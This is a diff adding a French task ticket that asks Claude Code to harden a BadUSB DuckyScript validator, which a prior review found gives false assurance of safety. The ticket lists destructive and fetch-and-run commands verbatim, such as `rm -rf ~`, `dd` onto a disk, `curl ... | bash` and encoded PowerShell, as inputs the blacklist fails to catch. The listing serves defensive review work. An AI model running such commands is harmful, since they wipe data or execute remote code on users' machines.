@@ -139,3 +139,44 @@ Leçon d'aiguillage : bon aiguillage. Réserve : le choix liste noire vs liste b
 
 **Suite à donner** : acceptable en fusion. Ouvrir une fiche ultérieure pour durcir `validate_duckyscript` en liste blanche **avant** tout usage sur des payloads tiers.
 
+
+## Correction requise (durcir la validation BadUSB) — 2026-09-05
+
+Ajoutée après la revue indépendante ci-dessus. Le fond était « accepté avec réserve » : les payloads livrés sont tous non destructeurs, mais `validate_duckyscript` donne une fausse assurance de sécurité. On ferme l'angle mort **avant** tout usage sur des payloads tiers.
+
+### Défaut à corriger
+
+`badusb.py:108-141` : l'exclusion des commandes destructrices repose sur `_FORBIDDEN_PATTERNS`, une liste noire de 5 motifs littéraux. Passent à `True` : `rm -rf ~`, `dd if=/dev/zero of=/dev/sda`, `curl http://x | bash`, `shutdown /s`, `powershell -enc ...`, `diskpart`, `cipher /w`. La docstring et le journal d'origine annoncent une exclusion « sans commandes destructrices » qui n'est pas tenue pour un script arbitraire.
+
+### Agent assigné
+
+**Opus (Claude Code).** Le choix liste noire vs liste blanche est une décision de sécurité, réservée à Opus par `AGENTS.md`. Un test écrit par l'exécutant ne rattrape pas ce qu'il n'a pas pensé à interdire — c'est le critère d'aiguillage même.
+
+### Périmètre
+
+Fichiers à créer ou modifier, et eux seuls :
+
+```text
+src/momentum_ultra/badusb.py
+tests/test_badusb.py
+taches/tache-12-badusb-payloads.md
+```
+
+### Contrat
+
+Trois exigences, sans élargir le périmètre :
+
+1. **Honnêteté de l'interface.** `validate_duckyscript` valide la **syntaxe** (chaque ligne non-`REM` commence par un mot-clé DuckyScript connu), pas l'innocuité. Sa docstring le dit explicitement et cesse de laisser croire à un filtre anti-destructif. La liste noire peut rester en défense en profondeur, mais n'est plus présentée comme une garantie.
+2. **Garantie sur ce qui est livré.** `get_default_payloads` n'expose que des payloads de catégories sûres (`ADMIN`/`NETWORK`/`DEMO`, lecture seule / diagnostic), chacun revalidé avant export.
+3. **Barrière pour l'avenir.** Tant qu'aucune liste blanche stricte de contenu n'existe, aucune API publique n'accepte un script tiers en le présentant comme « validé sûr ».
+
+### Critères d'acceptation
+
+- [ ] `pytest` passe ; `ruff check .` et `ruff format --check .` ne signalent rien.
+- [ ] La docstring de `validate_duckyscript` déclare qu'elle valide la syntaxe et **non** l'innocuité.
+- [ ] Un test documente explicitement qu'une commande destructrice en clair (p. ex. `STRING rm -rf ~`) passe la validation **syntaxique** — pour que personne ne reprenne cette fonction comme filtre de sécurité.
+- [ ] Un test vérifie que les cinq payloads par défaut sont non destructeurs (catégories sûres, revalidés avant export).
+
+### Conditions d'arrêt
+
+- Une vraie liste blanche de contenu (au-delà de la syntaxe) est demandée : elle dépasse ce périmètre → ouvrir une fiche dédiée.
